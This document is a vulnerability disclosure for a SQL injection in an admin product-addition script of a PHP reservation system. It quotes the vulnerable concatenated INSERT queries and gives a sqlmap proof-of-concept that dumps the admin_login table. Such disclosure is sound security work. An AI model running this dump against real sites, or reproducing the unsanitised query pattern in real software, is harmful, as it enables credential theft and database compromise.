# SQL Injection Vulnerability in prod.php (Product Addition)

**Project**: Online Product Reservation System In PHP With Source Code

**Vendor**: Source Code & Projects (code-projects.org)

**Vulnerable File**: handgunner-administrator/prod.php

**Version**: V1.0

**Description**:

A critical SQL injection vulnerability exists in the product addition functionality. The application directly concatenates multiple POST parameters into SQL INSERT queries without validation, allowing attackers to extract sensitive database data.

### Analyse

**Vulnerability: SQL Injection in INSERT Query**

```php
$price = $_POST['price'];
$name = $_POST['name'];
$model = $_POST['model'];
$serial = $_POST['serial'];
$cat = $_GET['cat'];

mysql_query("INSERT INTO products (price, name, image, model, serial_no)
VALUES('$price', '$name', '$image', '$model', '$serial')");

mysql_query("INSERT into cat_prod (prod, cat) VALUES('$id', '$cat')");
```

**Vulnerability Analysis**:

1. **Multiple Injection Points**: `price`, `name`, `model`, `serial` (POST) and `cat` (GET)
2. **No Input Validation**: All parameters directly concatenated into SQL
3. **No Prepared Statements**: Uses deprecated `mysql_query()` function
4. **No Authentication**: File can be accessed without login

### POC

```bash
sqlmap -u "http://target.com/handgunner-administrator/prod.php?cat=1" \
  --data="price=100&name=test&model=test&serial=123&description=test" \
  --batch \
  -D cj_handgunner \
  -T admin_login \
  --dump
```

[![pZU4Mc9.png](https://s41.ax1x.com/2026/01/03/pZU4Mc9.png)](https://imgchr.com/i/pZU4Mc9)

**References**:
- OWASP SQL Injection: https://owasp.org/www-community/attacks/SQL_Injection
- CWE-89: https://cwe.mitre.org/data/definitions/89.html
